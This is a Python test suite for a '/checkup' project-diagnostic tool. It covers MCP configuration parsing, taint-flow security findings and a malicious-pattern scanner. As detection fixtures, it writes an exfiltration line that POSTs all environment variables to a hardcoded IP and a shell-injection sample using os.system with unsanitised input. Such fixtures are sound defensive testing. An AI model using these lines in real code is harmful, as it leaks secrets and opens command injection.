#!/usr/bin/env python3
"""Tests for /checkup.

    python -m skills.checkup.test_checkup
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
from pathlib import Path
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from skills.checkup.cli import (
    run, format_pr_comment, PR_COMMENT_MARKER, doctor, _nn_summary, _verdict,
)
from skills.checkup.mcp import inspect_mcp, tomllib


def _mcp_checks(state):
    from skills.plugins.installer import install_plugins, SUPPORTED_TOOLS
    from skills.infra_advisor.advisor import _mcp_wired

    with tempfile.TemporaryDirectory() as d:
        root = Path(d)
        config = root / ".mcp.json"

        def write(doc):
            config.write_text(json.dumps(doc), encoding="utf-8")

        for label, doc in (
            ("array root", []), ("null root", None),
            ("array container", {"mcpServers": []}),
            ("empty entry", {"mcpServers": {"botte-llm": {}}}),
            ("null entry", {"mcpServers": {"botte-llm": None}}),
        ):
            write(doc)
            summary = inspect_mcp(root)
            _ok(f"MCP {label} is invalid without a false wired flag",
                summary["status"] == "invalid" and not _mcp_wired(root), state)

        config.write_text("{", encoding="utf-8")
        _ok("malformed JSON is a diagnostic, not a traceback",
            inspect_mcp(root)["status"] == "invalid", state)
        config.write_bytes(b"\xff")
        _ok("non-UTF8 MCP configuration is invalid",
            inspect_mcp(root)["status"] == "invalid", state)
        config.write_bytes(b" " * (128 * 1024 + 1))
        _ok("MCP inspection bounds configuration input",
            inspect_mcp(root)["sources"][0]["reason"] == "configuration_size_limit", state)
        config.unlink()
        config.mkdir()
        _ok("non-regular configuration is unreadable rather than opened",
            inspect_mcp(root)["status"] == "unreadable", state)
        config.rmdir()

        for label, entry in (
            ("disabled", {"disabled": True, "command": "botte-mcp"}),
            ("not enabled", {"enabled": False, "command": "botte-mcp"}),
        ):
            write({"mcpServers": {"botte-llm": entry}})
            _ok(f"MCP {label} is not an enabled declaration",
                inspect_mcp(root)["status"] == "disabled" and not _mcp_wired(root), state)

        write({"mcpServers": {"botte-llm": {"command": "botte-mcp"}}})
        with patch("skills.checkup.mcp.shutil.which", return_value=None):
            missing = inspect_mcp(root)
        source = missing["sources"][0]
        _ok("configured declaration can have a missing launcher",
            missing["status"] == "configured"
            and source["launcher"] == {"status": "not_found", "basis": "current_process_PATH"}, state)
        with patch("skills.checkup.mcp.shutil.which", return_value="/example/botte-mcp"):
            found = inspect_mcp(root)
        _ok("found launcher does not imply installed runtime or reachability",
            found["sources"][0]["launcher"]["status"] == "found"
            and found["runtime"] == found["reachability"] == "not_checked", state)
        _ok("diagnostic explicitly limits scope to project files",
            found["scope"] == "project_files_only"
            and "installed_plugin_configuration" in found["not_inspected"], state)
        _ok("PR output labels configuration separately from availability",
            "MCP declaration **configured**; runtime/reachability not checked"
            in format_pr_comment({"drift": [], "mcp_wiring": found}), state)

        for entry in (
            {"command": sys.executable, "cwd": str(root)},
            {"command": "botte-mcp", "env": {"PATH": "private-value"}},
        ):
            write({"mcpServers": {"botte-llm": entry}})
            result = inspect_mcp(root)
            _ok("host cwd/env prevents misleading current-process launcher claim",
                result["sources"][0]["launcher"]["status"] == "not_checked"
                and "private-value" not in json.dumps(result), state)

        for entry in (
            {"command": "python", "args": ["\x00"]},
            {"command": "python", "env": []},
            {"command": "python", "cwd": False},
            {"command": "python", "enabled": "false"},
            {"url": "https://localhost:notaport/mcp"},
        ):
            write({"mcpServers": {"botte-llm": entry}})
            _ok("impossible launch fields are diagnosed as invalid",
                inspect_mcp(root)["status"] == "invalid", state)

        write({"mcpServers": {"botte-llm": {"command": "/" + "a" * 4000}}})
        _ok("filesystem launcher errors cannot abort inspection",
            inspect_mcp(root)["status"] == "configured", state)
        write({"mcpServers": {"botte-llm": {"url": "https://example.invalid/mcp"}}})
        remote = inspect_mcp(root)
        _ok("HTTP declaration is retained without a network probe",
            remote["status"] == "configured"
            and remote["sources"][0]["transport"] == "http"
            and remote["reachability"] == "not_checked", state)

        # The configured file is executable, but inspection must never run it.
        script = root / "never-run"
        marker = root / "executed"
        script.write_text(f"#!{sys.executable}\nfrom pathlib import Path\nPath({str(marker)!r}).touch()\n", encoding="utf-8")
        script.chmod(0o755)
        write({"mcpServers": {"botte-llm": {"command": str(script)}}})
        inspect_mcp(root)
        _ok("static MCP inspection never executes a configured command", not marker.exists(), state)

        write({"mcpServers": {"botte-llm": {}}})
        with patch.dict(os.environ, {"BOTTE_CHECKUP_CONTEXT": "github-pr"}):
            broken_ci = run(root)
        _ok("ephemeral CI does not hide a malformed configuration",
            broken_ci["mcp_wiring"]["status"] == "invalid"
            and any("MCP declaration status is invalid" in x for x in broken_ci["drift"]), state)

    for tool in SUPPORTED_TOOLS:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            install_plugins(root, tools=(tool,))
            result = inspect_mcp(root)
            expected = "unsupported" if tool == "hermes" or (tool == "codex" and tomllib is None) else "configured"
            _ok(f"generated {tool} adapter is recognized or explicitly unsupported",
                result["status"] == expected and result["reachability"] == "not_checked", state)

    with tempfile.TemporaryDirectory() as d:
        root = Path(d)
        (root / ".codex").mkdir()
        (root / ".codex" / "config.toml").write_text('[mcp_servers."botte-llm"]\ncommand = "python"\n', encoding="utf-8")
        with patch("skills.checkup.mcp.tomllib", None):
            _ok("Python 3.10 TOML parser absence is explicit",
                inspect_mcp(root)["status"] == "unsupported", state)
        if tomllib is not None:
            (root / ".codex" / "config.toml").write_text('[mcp_servers.\n', encoding="utf-8")
            _ok("malformed TOML is invalid when a parser is available",
                inspect_mcp(root)["status"] == "invalid", state)

    with tempfile.TemporaryDirectory() as d:
        root = Path(d)
        (root / ".mcp.json").write_text('{"mcpServers":{"botte-llm":{"command":"python"}}}', encoding="utf-8")
        (root / ".cursor").mkdir()
        (root / ".cursor" / "mcp.json").write_text('[]', encoding="utf-8")
        mixed = run(root)
        _ok("valid declaration does not hide an invalid second host source",
            mixed["mcp_wiring"]["status"] == "configured"
            and any("could not be validated" in x for x in mixed["drift"]), state)

    for machine in ({}, {"available": False},
                    {"available": True, "uses_local_models": False},
                    {"available": True, "uses_local_models": True}):
        verdict = _verdict({"drift": [], "machine": machine})
        _ok("doctor never infers active host routing or cloud dispatch",
            "routing local actif" not in verdict and "chaque tâche part au cloud" not in verdict
            and "vérifi" in verdict, state)


def _ok(msg, cond, state):
    print(f"  [{'PASS' if cond else 'FAIL'}] {msg}")
    state[0 if cond else 1] += 1


def main() -> int:
    state = [0, 0]
    print("== checkup tests ==")
    _mcp_checks(state)

    with tempfile.TemporaryDirectory() as d:
        proj = Path(d)
        (proj / "app.py").write_text("def f():\n    return 1\n", encoding="utf-8")
        r = run(proj)
        _ok("returns the canonical sections",
            all(k in r for k in ("directives", "infra_tips", "duplication",
                                 "cost", "by_component", "drift", "headline",
                                 "security", "malicious", "nn")), state)
        _ok("clean project has no security findings",
            r["security"]["count"] == 0 and r["security"]["available"], state)
        _ok("clean project has a malicious-scan section, nothing suspicious",
            r["malicious"]["available"] and r["malicious"]["suspicious"] == 0, state)
        _ok("nn audit is skipped when the project ships no botte_nn",
            r["nn"]["available"] is False, state)

        (proj / "help_text.py").write_text(
            "print('Install with: pip install numpy')\n"
            "needles = ('exec(', 'shell=True')\n",
            encoding="utf-8",
        )
        rh = run(proj)
        _ok("help and pattern-catalog text is not treated as malicious",
            rh["malicious"]["suspicious"] == 0, state)
        (proj / "runtime_install.py").write_text(
            "import subprocess\nsubprocess.run(['pip', 'install', 'unknown'])\n",
            encoding="utf-8",
        )
        ri = run(proj)
        _ok("runtime pip install remains a high-signal finding",
            ri["malicious"]["suspicious"] >= 1, state)
        (proj / "runtime_install.py").unlink()

        # a project with a real taint flow surfaces in security + drift + comment
        (proj / "vuln.py").write_text(
            "import os, sys\nos.system('echo ' + sys.argv[1])\n", encoding="utf-8")
        rv = run(proj)
        _ok("taint flow surfaces in checkup security",
            rv["security"]["count"] >= 1 and "CWE-78" in rv["security"]["by_cwe"], state)
        _ok("high-severity security adds a drift item",
            any("security finding" in x for x in rv["drift"]), state)
        _ok("security appears in the PR comment",
            "🛡️ Security" in format_pr_comment(rv), state)

        # exfiltration (POST env to a hardcoded IP — high-signal) → suspicious + drift
        (proj / "evil.py").write_text(
            "import os, requests\n"
            "requests.post('http://13.37.13.37/x', data=dict(os.environ))\n",
            encoding="utf-8")
        rm = run(proj)
        _ok("malicious-pattern scan flags obfuscated exec as suspicious",
            rm["malicious"]["suspicious"] >= 1, state)
        _ok("suspicious patterns add a drift item",
            any("suspicious code pattern" in x for x in rm["drift"]), state)
        _ok("malicious section appears in the PR comment",
            "🦠 Malicious-pattern scan" in format_pr_comment(rm), state)
        _ok("analysis cost is 0 LLM tokens", r["cost"]["analysis_llm_tokens"] == 0, state)
        _ok("flags missing policy as drift",
            any("policy" in x.lower() for x in r["drift"]), state)
        _ok("flags MCP-not-wired as drift",
            any("MCP" in x for x in r["drift"]), state)
        _ok("local MCP status remains actionable",
            r["mcp_wiring"]["status"] == "missing" and r["mcp_wiring"]["applicable"], state)

        previous_context = os.environ.get("BOTTE_CHECKUP_CONTEXT")
        os.environ["BOTTE_CHECKUP_CONTEXT"] = "github-pr"
        try:
            r_ci = run(proj)
        finally:
            if previous_context is None:
                os.environ.pop("BOTTE_CHECKUP_CONTEXT", None)
            else:
                os.environ["BOTTE_CHECKUP_CONTEXT"] = previous_context
        _ok("ephemeral PR checkup marks MCP wiring not applicable",
            r_ci["mcp_wiring"]["status"] == "not_applicable"
            and not any("MCP not wired" in x for x in r_ci["drift"]), state)
        _ok("PR comment explains why MCP wiring is not applicable",
            "MCP wiring **n/a in ephemeral CI**" in format_pr_comment(r_ci), state)
        _ok("result is JSON-serialisable", isinstance(json.dumps(r), str), state)

        # after committing a policy, that particular drift item goes away
        from skills.preflight import policy
        policy.write_default(proj)
        r2 = run(proj)
        _ok("policy drift clears once committed",
            r2["policy_committed"] and not any("No .botte/policy" in x for x in r2["drift"]),
            state)

        # PR comment formatting (for the GitHub Action)
        md = format_pr_comment(r)  # r has drift (no policy / no MCP)
        _ok("PR comment carries the stable marker", PR_COMMENT_MARKER in md, state)
        _ok("PR comment shows a drift verdict when there is drift",
            "drift item" in md and "### Drift to fix" in md, state)
        _ok("PR comment lists each drift item",
            all(x in md for x in r["drift"]), state)

        md_clean = format_pr_comment({"drift": [], "headline": "All good",
                                      "loc_total": 10, "policy_committed": True,
                                      "cost": {"analysis_llm_tokens": 0,
                                               "always_on_tokens_per_session": 0}},
                                     repo="zedarvates/botte-secrete", sha="abc1234def")
        _ok("PR comment shows the no-drift verdict", "No drift" in md_clean, state)
        _ok("PR comment links the commit when repo+sha given",
            "abc1234" in md_clean and "/commit/abc1234def" in md_clean, state)

    with tempfile.TemporaryDirectory() as d:
        proj = Path(d)
        (proj / "app.py").write_text("def f():\n    return 1\n", encoding="utf-8")
        dr = doctor(proj)
        _ok("doctor() adds machine + top_actions + verdict on top of checkup",
            all(k in dr for k in ("machine", "top_actions", "verdict", "drift", "headline")), state)
        _ok("doctor() verdict is a non-empty string", isinstance(dr["verdict"], str) and dr["verdict"], state)
        _ok("doctor() top_actions is capped at 3", len(dr["top_actions"]) <= 3, state)
        _ok("doctor() result is JSON-serialisable", bool(json.dumps(dr)), state)

        # machine section never raises even if llm_backends can't reach anything
        m = dr["machine"]
        _ok("machine section reports availability + backend list shape",
            "available" in m and (not m["available"] or "uses_local_models" in m), state)

    # Active-learning readiness: observations are visible but only explicit
    # feedback counts toward training/activation gates.
    from skills.botte_nn import active_learning as al_mod
    old_data_dir = al_mod.DATA_DIR
    with tempfile.TemporaryDirectory() as d:
        al_mod.DATA_DIR = Path(d) / "active_learning"
        try:
            al_mod.record_observation("binary_router", [0.2, 1.0, 1.0], 0,
                                      "local_returned")
            al_mod.record_feedback("binary_router", [0.7, 1.0, 1.0], 0, 1)
            al_mod.record_feedback(
                "compressibility_predictor", [0.1] * 6, 2, 2,
                outcome="oracle:compression_roundtrip",
            )
            al_mod.record_feedback(
                "semantic_cache_hit_predictor", [0.1] * 7, 0, 1,
                outcome="oracle:response_cache_exact_hit",
            )
            summary = _nn_summary(Path(__file__).resolve().parents[2])
            learning = summary["learning"]
            _ok("nn summary separates observations from verified verdicts",
                learning["observations"] == 1 and learning["verified"] == 1, state)
            _ok("binary_router stays blocked below the honest data gates",
                not learning["train_ready"] and not learning["activation_ready"], state)
            _ok("nn summary exposes verified labels for every grounded model",
                learning["models"]["compressibility_predictor"]["verified"] == 1
                and learning["models"]["semantic_cache_hit_predictor"]["verified"] == 1,
                state)
            comment = format_pr_comment({"drift": [], "nn": summary,
                                         "policy_committed": True, "cost": {}})
            _ok("PR comment exposes verified-ledger readiness",
                "1/2,000 verified" in comment and "activation blocked" in comment, state)
            _ok("PR comment exposes automatic-oracle grounding progress",
                "compressibility_predictor=1" in comment
                and "semantic_cache_hit_predictor=1" in comment, state)
        finally:
            al_mod.DATA_DIR = old_data_dir

    passed, failed = state
    print(f"\nRESULT: {passed} passed, {failed} failed")
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
